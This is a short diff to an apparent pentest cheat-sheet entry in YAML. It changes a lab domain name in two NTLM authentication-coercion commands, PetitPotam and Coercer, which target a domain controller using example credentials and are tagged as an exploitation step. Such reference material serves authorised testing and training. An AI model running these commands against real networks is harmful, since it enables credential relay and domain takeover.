@@ -16,10 +16,10 @@ commands:
   - have: Credentials
     cmd: |
       # PetitPotam — coerce NTLM auth from DC (authenticated)
-      python3 PetitPotam.py -u sec_user -p 'P@ssw0rd' -d senshu.sh 10.10.10.21 10.10.10.27
+      python3 PetitPotam.py -u sec_user -p 'P@ssw0rd' -d senshu.local 10.10.10.21 10.10.10.27
 
       # Coercer — automated authentication coercion
-      python3 Coercer.py coerce -u sec_user -p 'P@ssw0rd' -d senshu.sh -l 10.10.10.21 -t 10.10.10.27
+      python3 Coercer.py coerce -u sec_user -p 'P@ssw0rd' -d senshu.local -l 10.10.10.21 -t 10.10.10.27
 phase:
   - Exploitation
 target_os:
